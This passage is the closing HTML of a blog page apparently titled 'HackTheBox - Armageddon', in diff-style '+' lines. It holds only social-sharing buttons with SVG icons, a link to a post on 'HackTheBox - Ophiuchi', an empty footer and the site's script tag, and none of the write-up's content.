+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-armageddon%2f&amp;title=HackTheBox%20-%20Armageddon&amp;summary=HackTheBox%20-%20Armageddon&amp;source=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-armageddon%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-armageddon%2f&amp;resubmit=true&amp;title=HackTheBox%20-%20Armageddon" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-armageddon%2f;title=HackTheBox%20-%20Armageddon" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HackTheBox%20-%20Armageddon%20https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-armageddon%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-armageddon%2f&amp;t=HackTheBox%20-%20Armageddon" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HackTheBox%20-%20Armageddon&amp;url=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-armageddon%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        <div class="pagination__title">
+            <span class="pagination__title-h"></span>
+            <hr />
+        </div>
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://brunomcuesta.github.io/posts/2021/07/hackthebox-ophiuchi/">
+                    <span class="button__text">HackTheBox - Ophiuchi</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://brunomcuesta.github.io/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>
+
+
+
+    </body>
+</html>
